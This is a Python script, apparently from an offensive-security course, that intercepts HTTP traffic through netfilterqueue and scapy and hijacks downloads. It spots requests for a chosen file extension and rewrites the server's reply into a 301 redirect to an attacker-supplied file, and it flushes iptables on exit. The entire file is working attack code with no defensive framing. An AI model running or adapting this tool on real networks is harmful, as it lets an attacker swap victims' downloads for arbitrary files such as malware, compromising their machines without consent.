import netfilterqueue
import scapy.all as scapy
import argparse
import subprocess
from dns_spoof import set_ip_tables

ack_list = []
file_extension = ""
file_replacer_path = ""


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-q', '--queue-local-forward', dest="queue", help='Queue [local/forward]')
    parser.add_argument('-n', '--queue-num', dest="queue_n", help='Queue num')
    parser.add_argument('-e', '--file-extension', dest="file_extension", help='Host name')
    parser.add_argument('-f', '--file-replacer', dest="file_replacer", help='File that replace')
    options_from_parser = parser.parse_args()
    if not options_from_parser.queue:
        parser.error('[-] Please specify if queue is local or forward, use --help for more info.')
    if not options_from_parser.queue_n:
        parser.error('[-] Please specify a queue num, use --help for more info.')
    if not options_from_parser.file_extension:
        parser.error('[-] Please specify file_extension , use --help for more info.')
    if not options_from_parser.file_replacer:
        parser.error('[-] Please specify file_replacer, use --help for more info.')

    return options_from_parser


def set_load(packet, payload_string):
    packet[scapy.Raw].load = payload_string
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if file_extension in str(scapy_packet[scapy.Raw].load):
                print('[+] jpg Request')
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)

                print('[+] Replacing file')
                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\r\nLocation: " + file_replacer_path
                )

                packet.set_payload(bytes(modified_packet))

    packet.accept()


def start_attack(queue_num, queue_local_forward):
    if not set_ip_tables(queue_num, queue_local_forward):
        print('[-] Iptables settings fails ' + queue_num + ' ' + queue_local_forward)
        return False

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(queue_num), process_packet)
    queue.run()


if __name__ == "__main__":
    options = get_arguments()
    try:
        file_extension = options.file_extension
        file_replacer_path = options.file_replacer
        start_attack(options.queue_n, options.queue)
    except KeyboardInterrupt:
        print('\n[+] Detected CTRL + C, quitting...')
        subprocess.call(['sudo', 'iptables', '--flush'])
        print('[+] Attack ended!')
